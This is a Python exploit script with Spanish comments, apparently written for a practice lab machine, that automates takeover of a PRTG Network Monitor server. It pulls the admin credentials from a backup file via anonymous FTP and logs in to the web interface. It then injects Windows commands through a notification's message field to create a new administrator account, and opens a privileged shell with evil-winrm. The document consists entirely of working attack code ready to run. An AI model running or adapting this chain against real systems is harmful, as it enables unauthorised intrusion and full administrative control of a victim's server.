from pwn import *
from ftplib import FTP
import sys, time, socket, requests


# Configuracion
target = "10.10.10.152"
user_privesc = "teco2"
password_privesc = "t3cO123!"


# Ctrl + C
def def_handler(sig, frame):
    log.error("Saliendo del programa")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# Comprobamos conexion con el puerto FTP
def checkFTP():
    print()
    log.info("Comprobando conexion con el puerto FTP")
    time.sleep(1)
    
    try:
        with socket.create_connection((target, 21)):
            log.success("Conexion exitosa")
    except Exception as e:
        log.error(f"Conexion fallida: {e}")


# Nos logeamos como Anonymous, descargamos y extraemos las credenciales
def credentialFTP():
    time.sleep(1)
    log.info("Conectandonos a FTP como Anonymous")
    
    # Logeo
    try:
        ftp = FTP(target)
        ftp.login()
        log.success("Login exitoso")
    except Exception as e:
        log.error(f"Login fallido: {e}")
    
    # Descarga de archivo
    time.sleep(1)
    log.info("Descargando Configuracion.old.bak")
    try:
        with open("PRTG Configuration.old.bak", "wb") as f:
            ftp.retrbinary(f"RETR /ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak", f.write)
        log.success("Descarga exitosa")
    except Exception as e:
        log.error(f"Descarga fallida: {e}")

    # Extraer credenciales
    time.sleep(1)
    log.info("Extrayendo credenciales")
    try:
        time.sleep(1)
        user = subprocess.run("cat PRTG\\ Configuration.old.bak | grep -oP '<!-- User: \\K[^ ]+'", shell=True, text=True, capture_output=True)
        password = subprocess.run("cat PRTG\\ Configuration.old.bak | grep -A1 '<!-- User: prtgadmin -->' | tail -n1 | tr -d ' '", shell=True, text=True, capture_output=True)
        
        cred_user = user.stdout.strip()
        cred_password = password.stdout.strip()
        
        prefix = cred_password[:-1]
        last_digit = cred_password[-1]
        
        new_digit = str(int(last_digit)+1)
        new_password = prefix + new_digit
        
        log.success(f"Usuario: {cred_user}")
        log.success(f"Password: {new_password}")
        
        return cred_user, new_password
    
    except Exception as e:
        log.error(f"No se pudo extraer las credenciales: {e}")
    finally:
        subprocess.run("rm 'PRTG Configuration.old.bak'", shell=True, text=True)


# Nos logeamos como admin en el Network Monitor
def login(user, password):
    url = f"http://{target}/public/checklogin.htm"
    
    # Creamos y mantenemos una sesion
    s = requests.session()
    
    # Enviamos una peticion get para comprobar si tenemos conexion
    r = s.get(url)
    
    if r.status_code != 200:
        log.error("Error en la peticion HTTP")
    else:
        log.success("Peticion HTTP exitosa")
        
        # Creamos el body
        time.sleep(1)
        log.info("Intentando login")
        try:
            
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                "Referer": f"http://{target}/index.htm",
                "Origin": f"http://{target}",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            post_data = {
                "loginurl": "",
                "username": f"{user}",
                "password": f"{password}"
            }
            time.sleep(1)
            
            # Enviamos el body creado para logearnos
            r = s.post(url, data=post_data, headers=headers)
            
            if r.url.endswith("/welcome.htm") or r.url.endswith("/index.htm") or "logout" in r.text.lower():
                log.success("Login exitoso")
            else:
                log.error("Login fallido")
        except Exception as e:
            log.error(f"Error al logearnos {e}")
    return s    


# Creamos una notificacion que contiene codigo malicioso para crear un usuario con privilegios
def createNotification(s):
    url = f"http://{target}/editsettings"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Referer": f"http://{target}/editnotification.htm?id=new&tabid=1",
        "Origin": f"http://{target}",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    post_data = {
        "name_": "Notification2",
        "active_": "1",
        "active_10": "1",
        "address_10": "Demo EXE Notification - OutFile.ps1",
        "message_10": f"prueba.txt; net user {user_privesc} {password_privesc} /add; net localgroup Administrators {user_privesc} /add",
        "timeout_10": "60",
        "objecttype": "notification",
        "id": "new",
        "targeturl": "/myaccount.htm?tabid=2"
    }
    
    try:
        time.sleep(1)
        r = s.post(url, data=post_data, headers=headers)
        if r.status_code == 200:
            notif = r.json()
            id_notification = notif["objid"]
            log.success(f"Notificacion id:{id_notification} creada")
            return id_notification
            
    except Exception as e:
        log.error(f"Error al crear la notificacion {id_notification}: {e}")


# Ejecutamos la notificacion para que nos cree el usuario privilegiado
def startNotification(s, id_notification):
    url = f"http://{target}/api/notificationtest.htm"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Referer": f"http://{target}/myaccount.htm?tabid=1",
        "Origin": f"http://{target}",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    post_data = {
        "id": f"{id_notification}"
    }

    try:
        time.sleep(1)
        log.info("Ejecutando RCE para crear un usuario privilegiado")
        time.sleep(1)
        r = s.post(url, data=post_data, headers=headers)
        if r.status_code == 200:
            log.success("Usuario creado con exito")
    except Exception as e:
        log.error(f"No se pudo crear el usuario: {e}")


# Nos logeamos con permisos de Admin
def shell():
    time.sleep(1)
    log.info("Obteniendo powershell con privilegios")
    time.sleep(1)
    try:
        subprocess.run(f"evil-winrm -i {target} -u '{user_privesc}' -p '{password_privesc}'", shell=True, text=True)
    except Exception as e:
        log.error(f"Error inesperado: {e}")


if __name__ == '__main__':
    
    checkFTP()
    user, password = credentialFTP()
    s = login(user, password)
    id_notification = createNotification(s)
    startNotification(s, id_notification)
    shell()